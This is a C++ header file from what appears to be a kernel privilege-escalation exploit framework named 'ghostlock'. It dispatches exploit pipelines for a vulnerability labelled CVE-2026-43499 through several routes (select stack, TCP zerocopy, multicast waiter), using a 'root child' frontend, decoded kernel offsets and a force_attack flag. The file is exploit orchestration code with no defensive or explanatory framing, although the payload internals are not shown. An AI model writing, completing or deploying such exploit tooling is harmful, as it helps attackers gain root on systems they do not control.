#ifndef GHOSTLOCK_ORCHESTRATOR_HPP
#define GHOSTLOCK_ORCHESTRATOR_HPP

#include "route/component_catalog.hpp"
#include "route/pipeline.hpp"
#include "route/route_policy.hpp"
#include "session/backend/cve_2026_43499_backend.hpp"
#include "session/exploit_session.hpp"
#include "session/root_child_frontend.hpp"

namespace ghostlock::runtime {
    /* NativeOrchestrator (Batch 3/4): validate the component selection outside
     * the sensitive window and dispatch the catalogued combination through
     * direct template calls (no indirect dispatch). The switch enumerates the
     * exact values component_catalog::dispatch_target() can return, and the
     * Pipeline template instantiations are compile-time checked against the
     * catalogue, so predicate and dispatch share one authority. */
    [[nodiscard]] inline RunResult run_orchestrated_pipeline(
        session::ExploitSession &exploit_session, const ComponentSelection &selection,
        const profile::kernel_offsets &decoded, const char *debug_dir, bool force_attack) {
        switch (dispatch_target(selection)) {
            case DispatchTarget::RootChild_Cve43499_SelectStack: {
                using P = Pipeline<session::frontend::RootChildPolicy,
                                   session::backend::Cve2026_43499Policy,
                                   route::SelectPolicy>;
                static_assert(P::target == DispatchTarget::RootChild_Cve43499_SelectStack,
                              "dispatch case must match the pipeline's target");
                return P::run(exploit_session, decoded, debug_dir, force_attack);
            }
            case DispatchTarget::RootChild_Cve43499_TcpZerocopy: {
                using P = Pipeline<session::frontend::RootChildPolicy,
                                   session::backend::Cve2026_43499Policy,
                                   route::TcpPolicy>;
                static_assert(P::target == DispatchTarget::RootChild_Cve43499_TcpZerocopy,
                              "dispatch case must match the pipeline's target");
                return P::run(exploit_session, decoded, debug_dir, force_attack);
            }
            case DispatchTarget::RootChild_Cve43499_MulticastWaiter: {
                using P = Pipeline<session::frontend::RootChildPolicy,
                                   session::backend::Cve2026_43499Policy,
                                   route::MulticastPolicy>;
                static_assert(P::target == DispatchTarget::RootChild_Cve43499_MulticastWaiter,
                              "dispatch case must match the pipeline's target");
                return P::run(exploit_session, decoded, debug_dir, force_attack);
            }
            case DispatchTarget::None:
                return RunResult{.code = RunCode::Rejected};
        }
        return RunResult{.code = RunCode::Rejected};
    }
} // namespace ghostlock::runtime

#endif
